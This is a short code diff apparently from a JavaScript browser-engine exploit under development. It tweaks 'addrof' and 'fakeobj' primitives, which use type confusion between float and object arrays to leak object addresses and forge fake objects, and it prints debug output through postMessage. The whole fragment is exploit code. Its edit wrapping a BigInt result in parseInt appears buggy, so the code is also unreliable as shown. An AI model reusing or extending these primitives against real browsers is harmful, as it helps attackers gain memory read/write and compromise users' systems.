@@ -108,7 +108,7 @@ var qwordAsFloat = qword => {
             // temporary implementations
             addrof = (val) => {
               b1[0] = val;
-              return float2bigint(a1[offset],true);
+              return parseInt(float2bigint(a1[offset],true),16);
             }
             fakeobj = (addr) => {
               a1[offset] = bigint2float(addr);
@@ -121,7 +121,7 @@ var qwordAsFloat = qword => {
             };
 
             let addr = addrof(obj);
-            port.postMessage("obj @ " + addr.toString(16));
+            port.postMessage("obj @ " + addr.toString());
             port.postMessage(typeof(addr) +"vs"+typeof(0x10n))
            
             let fakeArr = fakeobj(addr + 0x10n); //no way around this im forced to use bigint for fakeobj :(
